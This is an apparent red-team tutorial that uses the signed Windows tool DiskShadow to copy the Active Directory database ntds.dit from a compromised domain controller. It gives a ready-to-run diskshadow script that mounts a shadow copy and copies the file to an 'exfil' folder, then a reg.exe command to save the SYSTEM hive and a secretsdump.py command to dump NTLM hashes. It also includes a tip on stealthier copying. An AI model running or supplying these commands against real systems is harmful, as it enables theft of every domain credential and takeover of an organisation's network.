<title>Pulling ntds.dit Locally/Remotely using DiskShadow</title>

What is DiskShadow?<br/>
“DiskShadow.exe is a tool that exposes the functionality offered by the Volume Shadow Copy Service (VSS). &nbsp;By default, DiskShadow uses an interactive command interpreter similar to that of DiskRaid or DiskPart. &nbsp;DiskShadow also includes a scriptable mode.“<br/>
<br/>
DiskShadow is included in Windows Server 2008, Windows Server 2012, and Windows Server 2016 and is a Windows signed binary.<br/>
<br/>
The VSS features of DiskShadow require privileged-level access (with UAC elevation), however, several command utilities can be invoked by a non-privileged user. &nbsp;This makes DiskShadow a very interesting candidate for command execution and evasive persistence.<br/>
<br/>
Assumptions:<br/>
<br/>
Compromise of an active DC<br/>
Running DiskShadow under privileged context in script mode<br/>
<br/>
diskshadow script (diskshadow.txt)<br/>
set context persistent nowriters<br/>
add volume c: alias someAlias<br/>
create<br/>
expose %someAlias% z:<br/>
exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit<br/>
delete shadows volume %someAlias%<br/>
reset<br/>
<br/>
In this script, we create a persistent shadow copy so that we can perform copy operations to capture the sensitive target file. &nbsp;By mounting a (unique) logical drive, we can guarantee a copy path for our target file, which we will extract to the ‘exfil’ directory before deleting our shadow copy identified by someAlias.<br/>
<br/>
*Note: We can attempt to copy out the target file by specifying a shadow device name /unique identifier. &nbsp;This is slightly stealthier, but it is important to ensure that labels/UUIDs are correct (via initial recon) or else the script will fail to run. &nbsp;This use case may be more suitable for Interactive Mode.<br/>
<br/>
In addition to the AD database, we will also need to extract the SYSTEM registry hive<br/>
<br/>
reg.exe save hklm\system c:\exfil\system.bak &nbsp;<br/>
<br/>
<br/>
<br/>
After transferring these files from the target machine, we use SecretsDump.py to extract the NTLM Hashes:<br/>
<br/>
secretsdump.py -ntds ntds.dit -system system.bak LOCAL&#09;&#09;&#09;&#09;#secretsdump.py by Impacket</body></html>
